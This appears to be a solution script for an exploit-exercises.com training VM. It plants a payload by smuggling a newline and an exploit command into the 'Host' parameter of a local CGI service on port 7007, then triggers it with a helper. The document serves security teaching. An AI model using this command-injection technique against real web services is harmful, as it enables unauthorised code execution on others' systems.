#!/bin/bash -eu
# Copyright (c) 2015, Heye Voecking <heye.voecking+exploit-exercises.com@gmail.com>

source $HOME/common/setup-exploit

PREPARED_HOST_STRING=$(printf "\n%s" $EXPLOIT_SCRIPT)
SERVICE=localhost:7007
if ! wget -qO- $SERVICE/index.cgi?Host="$PREPARED_HOST_STRING" >/dev/null 2>&1
then
  echo "ERROR: failed to plant exploit!" >&2
  echo "Sometimes the service to be exploited running on $SERVICE crashes." >&2
  echo "Restart the VM and try again." >&2
  false
fi

exploit_with_binary
